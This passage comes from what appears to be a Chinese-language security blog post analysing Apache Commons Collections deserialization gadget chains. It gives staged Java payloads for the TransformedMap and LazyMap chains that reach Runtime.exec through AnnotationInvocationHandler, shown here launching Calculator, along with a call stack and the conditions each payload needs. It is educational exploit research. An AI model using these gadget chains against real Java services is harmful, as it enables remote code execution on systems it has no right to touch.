<p>&#x4E0A;&#x8FF0;&#x4EE3;&#x7801;&#x867D;&#x7136;&#x80FD;&#x591F;&#x547D;&#x4EE4;&#x6267;&#x884C;&#xFF0C;&#x4F46;&#x662F;&#x4E0D;&#x662F;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;&#x9700;&#x8981;&#x7528;&#x5230;&#x7684;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x70B9;&#xFF0C;&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x5BF9;&#x4E0A;&#x8FF0;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x6539;&#x8FDB;&#xFF0C;&#x4F7F;&#x5176;&#x66F4;&#x63A5;&#x8FD1;&#x6211;&#x4EEC;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;&#x8C03;&#x7528;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x7528;&#x5230;&#x4E0A;&#x6587;&#x6211;&#x4EEC;&#x63D0;&#x5230;&#x8FC7;&#x7684; checkSetValue</p>
<p><a href="https://wooyun.js.org/drops/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95.html" target="_blank" rel="noopener"><strong>Level-2 payload</strong></a></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;open -a Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, chainDemo);</span><br><span class="line">        Map.Entry entryDemo = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        entryDemo.setValue(<span class="hljs-keyword">null</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><code>outerMap</code> &#x7ECF;&#x8FC7; <code>entrySet</code> -&gt; <code>iterator</code> -&gt; <code>next</code> &#x65B9;&#x6CD5;&#xFF0C; &#x6700;&#x7EC8;&#x4F7F; <code>MapEntry</code>&#x7C7B;&#x7684; <code>this.parent</code> &#x53D8;&#x91CF;&#x88AB;&#x9644;&#x503C;&#x6210; TransformedMap&#x7C7B;&#x7684;&#x5BF9;&#x8C61; <code>outerMap</code></p>
<p>&#x5728;&#x6700;&#x540E;&#x8C03;&#x7528;&#x7684;&#x65F6;&#x5019;&#x5148;&#x89E6;&#x53D1; <code>MapEntry</code> &#x7684;  <code>setValue</code> </p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209205806502.png" alt></p>
<p>&#x7136;&#x540E;&#x8C03;&#x7528;&#x5176;&#x65E9;&#x5C31;&#x6784;&#x9020;&#x597D;&#x7684; <code>valueTransformer</code> &#x7684; <code>transform</code> &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209210130168.png" alt></p>
<p>&#x5BF9;&#x4E8E;&#x76EE;&#x524D;&#x6765;&#x8BF4;&#xFF0C;&#x624B;&#x52A8;&#x89E6;&#x53D1;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x663E;&#x7136;&#x8FBE;&#x4E0D;&#x5230;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x7684;&#x6807;&#x51C6;&#xFF0C;&#x7531;&#x6B64;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4ECE; <code>readObject</code> &#x5F00;&#x59CB;&#x4E0B;&#x624B;&#x3002;&#x4E8E;&#x662F;&#x627E;&#x5230; AnnotationInvocationHandler &#x8FD9;&#x4E2A;&#x7C7B;&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#x8FD9;&#x4E2A;&#x7C7B;&#x4E0D;&#x80FD;&#x88AB;&#x5916;&#x90E8;&#x7C7B;&#x8BBF;&#x95EE;&#x5230;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x53CD;&#x5C04;&#x53BB;&#x8C03;&#x7528;&#x5B83;</p>
<p><strong>Level-3 TransformedMap &#x5229;&#x7528;&#x94FE; payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformedMapDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="hljs-string">&quot;key&quot;</span>, <span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, chainDemo);</span><br><span class="line">        Constructor construct = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">              </span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209221024520.png" alt></p>
<p>&#x8C03;&#x7528;&#x6808;</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">transform:121, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">checkSetValue:169, TransformedMap (org.apache.commons.collections.map)</span><br><span class="line">setValue:191, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)</span><br><span class="line">readObject:353, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:57, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:601, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1004, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1891, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1796, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1348, ObjectInputStream (java.io)</span><br><span class="line">readObject:370, ObjectInputStream (java.io)</span><br><span class="line">main:44, TransformedMapDemo (com.p2hm1n.cc.cc1)</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x770B;&#x4E00;&#x4E0B; <code>AnnotationInvocationHandler#readObject</code> &#x5927;&#x6982;&#x5C31;&#x77E5;&#x9053;&#x4E86;&#xFF0C;&#x5728;&#x8C03;&#x7528; <code>setValue</code> &#x540E;&#x5C31;&#x8DDF; level-2 &#x7684;payload &#x4E00;&#x6837;&#x4E86;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210209222512595.png" alt></p>
<p>&#x63D0;&#x70BC;&#x4E00;&#x4E0B; <code>AnnotationInvocationHandler</code> &#x7684;&#x7279;&#x5F81;</p>
<ul>
<li>&#x7C7B;&#x7684;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x63A5;&#x6536;Map&#x5BF9;&#x8C61;</li>
<li>&#x8FD9;&#x4E2A;&#x7C7B;&#x9700;&#x8981;&#x91CD;&#x5199; readObject&#x65B9;&#x6CD5;&#xFF0C;&#x91CD;&#x5199;&#x7684; readObject &#x65B9;&#x6CD5;&#x4E2D;&#x4F1A;&#x8C03;&#x7528;&#x5230; <code>AbstractMapEntryDecorator</code>&#x5B50;&#x7C7B; <code>MapEntry</code> &#x7684; <code>setValue</code>&#x65B9;&#x6CD5;</li>
</ul>
<p>&#x4E0B;&#x9762;&#x5206;&#x6790;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A; <strong>payload &#x7684;&#x9650;&#x5236;&#xFF1A;<code>innerMap.put(&quot;value&quot;, &quot;random&quot;);</code></strong></p>
<p>&#x9650;&#x5236;&#x662F;&#xFF1A;&#x5728;&#x4E0D;&#x6539;&#x52A8;&#x4E0B;&#x9762;&#x7684;&#x4EE3;&#x7801;&#x7684;&#x4F20;&#x53C2;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4E0A;&#x9762;&#x4EE3;&#x7801;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x4E3A; value</p>
<p>&#x53EF;&#x80FD;&#x6D89;&#x53CA;&#x5404;&#x79CD;&#x7248;&#x672C;&#x6539;&#x52A8;&#x95EE;&#x9898;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x7248;&#x672C;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x6211; JDK7u21 &#x7248;&#x672C;&#x4E0B;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x53EA;&#x80FD;&#x4F20;&#x6CE8;&#x89E3;&#x7C7B;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x770B;&#x4E00;&#x4E0B;&#x6784;&#x9020;&#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210010822748.png" alt></p>
<p>&#x5728; <code>AnnotationInvocationHandler#readObject</code> &#x4E2D; var2 &#x83B7;&#x53D6;&#x5230;&#x6CE8;&#x89E3;&#x7C7B;&#x5B9E;&#x4F8B;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x542B;&#x5F88;&#x591A;&#x4FE1;&#x606F;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210011230727.png" alt></p>
<p>&#x6838;&#x5FC3;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF0C;&#x4E3A;&#x4E86;&#x89E6;&#x53D1; RCE&#xFF0C;&#x9700;&#x8981;&#x6EE1;&#x8DB3; <code>var7 != null</code>&#xFF0C;var3 &#x662F;&#x83B7;&#x53D6;&#x4E86; var2 &#x4FE1;&#x606F;&#x7684; Hashmap&#xFF0C;var6&#x662F; &#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684; value &#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x51E0;&#x7ECF;&#x5468;&#x8F6C;&#x5728; MapEntry &#x8C03;&#x7528; getKey &#x5F97;&#x5230;&#x3002; &#x56E0;&#x6B64; var7 &#x5176;&#x5B9E;&#x662F;get&#x83B7;&#x53D6;&#x952E;&#x4E3A; &#x201C;value&#x201D; &#x7684;key&#x7684;value&#x503C;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210013650091.png" alt></p>
<p>&#x5F53; innerMap &#x7684;&#x503C;&#x4E3A;&#x5176;&#x4ED6;&#x65F6;&#xFF0C;var7&#x4E3A;&#x7A7A;&#xFF0C;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x5230;&#x540E;&#x9762;&#x7684;RCE&#x5229;&#x7528;&#x70B9;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210135056946.png" alt></p>
<p>&#x6700;&#x540E;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#x9650;&#x5236;&#x4E3A;&#xFF1A;</p>
<ol>
<li>handler &#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x662F;<strong>&#x5143;&#x6CE8;&#x89E3;&#x7C7B;</strong> &#xFF08;&#x5176;&#x5B9E;&#x597D;&#x50CF;&#x4E5F;&#x5C31; Retention &#x8DDF; Target &#x80FD;&#x7528;&#xFF09;</li>
<li>innerMap &#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x662F;&#x6CE8;&#x89E3;&#x7C7B;&#x7684;&#x65B9;&#x6CD5;&#x540D;</li>
</ol>
<h2 id="LazyMap-Gadget-chain"><a href="#LazyMap-Gadget-chain" class="headerlink" title="LazyMap Gadget chain"></a>LazyMap Gadget chain</h2><p>&#x540C;&#x7406;&#xFF0C;&#x6211;&#x4EEC;&#x5148;&#x5BF9; level-0 &#x7684;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x5347;&#x7EA7;&#xFF0C;&#x4F7F;&#x5176;&#x5229;&#x7528;&#x5230; LazyMap &#x7684;&#x65B9;&#x6CD5;&#x53BB;&#x89E6;&#x53D1; chain &#x7684; transform</p>
<p><strong>Level-1 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Class clz = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">        Constructor construct = clz.getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        LazyMap mapDemo = (LazyMap) construct.newInstance(innerMap, chainDemo);</span><br><span class="line">        mapDemo.get(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>Lazy&#x4E0D;&#x53EF;&#x4EE5;&#x76F4;&#x63A5; new &#x6765;&#x5B9E;&#x4F8B;&#x5316;&#xFF0C;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8C03;&#x7528;&#x3002;&#x5728;&#x5B9E;&#x4F8B;&#x5316;&#x7684;&#x65F6;&#x5019;&#x8C03;&#x7528;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x5BF9; <code>this.factory</code> &#x8FDB;&#x884C;&#x4E86;&#x9644;&#x503C;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210165032955.png" alt></p>
<p>LazyMap &#x7684; <code>get</code> &#x65B9;&#x6CD5;&#x8C03;&#x7528;&#x4E86;&#x5DF2;&#x7ECF;&#x9644;&#x503C;&#x7684; <code>this.factory</code>  &#x7684; <code>transform</code> &#x65B9;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x624B;&#x52A8;&#x8C03;&#x7528;&#x4E86; LazyMap &#x7684; get &#x65B9;&#x6CD5;&#xFF0C;&#x56E0;&#x6B64;&#x4F1A;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210165212176.png" alt></p>
<p>&#x83B7;&#x53D6;&#x5B9E;&#x4F8B;&#x5316;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; <code>LazyMap#decorate</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210175325623.png" alt></p>
<p><strong>Level-2 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo);</span><br><span class="line">        mapDemo.get(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x7531;&#x4E8E;&#x4E0A;&#x9762;&#x6211;&#x4EEC;&#x662F;&#x624B;&#x5DE5;&#x8C03;&#x7528;&#x7684; LazyMap &#x7684; <code>get</code> &#x65B9;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7ED3;&#x5408;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x7684;&#x8BDD;&#xFF0C;&#x8DDF;&#x4E0A;&#x9762; TransformedMap &#x4E00;&#x6837;&#xFF0C;&#x9700;&#x8981;&#x627E;&#x4E00;&#x4E2A;&#x91CD;&#x5199;&#x7684; <code>readObject</code> &#x91CC;&#x9762;&#x8C03;&#x7528;&#x4E86; <code>get</code> &#x65B9;&#x6CD5;&#x7684;&#x3002;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x5230;&#x7684;&#x8FD8;&#x662F; AnnotationInvocationHandler&#x3002;</p>
<p><strong>Level-3 LazyMap &#x5229;&#x7528;&#x94FE; payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LazyMapDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Class clz = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">        Constructor construct = clz.getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        LazyMap mapDemo = (LazyMap) construct.newInstance(innerMap, chainDemo);</span><br><span class="line">        Constructor handler_construct = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handler_construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_construct.newInstance(Override.class, mapDemo);</span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="hljs-keyword">new</span> Class[]{Map.class}, map_handler);</span><br><span class="line">        Constructor AnnotationInvocationHandler_Construct = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AnnotationInvocationHandler_Construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Construct.newInstance(Override.class, proxy_map);</span><br><span class="line">              </span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> 